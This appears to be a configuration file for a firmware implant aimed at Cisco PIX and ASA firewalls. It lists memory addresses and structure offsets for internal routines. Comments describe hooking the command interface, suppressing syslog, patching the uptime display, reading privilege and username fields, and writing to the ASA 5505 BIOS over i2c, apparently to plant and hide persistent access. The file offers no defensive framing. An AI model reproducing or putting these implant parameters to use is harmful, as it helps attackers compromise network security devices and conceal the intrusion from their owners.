; --- SECTION I ---
;
0x40080403            // pix version
0x1d4e000             // address of implant configuration
ASAFlashRmdirAddress      0x0835eb40      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x08346820      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x0835e630      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x08346500      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x084184e0      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x084190d0      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x08418980      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x08418ae0      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x08419f50      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x0917fe30      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x080617b0      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x0965c5c0      // addr of duart/0 tty entry
CIStartFunc               0x080b19e0      // addr of the command interface start function -- telnet function
CommandListAddr           0x09727bc0      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x09a6ba68      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x09174760      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x09cfd440      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000b38      // offset into the syslog structure where the logging level is stored
Open                      0x080619c0      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x09629520      // Address where the thread timeout value is stored 
UpTimeCounter             0x09b7dde0      // Address of the up time counter
Display_uptime_addr       0x080b9920      // Address of the function that display the uptime
Inserted_code_addr        0x090727ba      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x08d8e1e0      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x08d8e060      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080b1e9a      // Address of hook into the command interface
AvailMemoryPtr            0x09c8f300      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
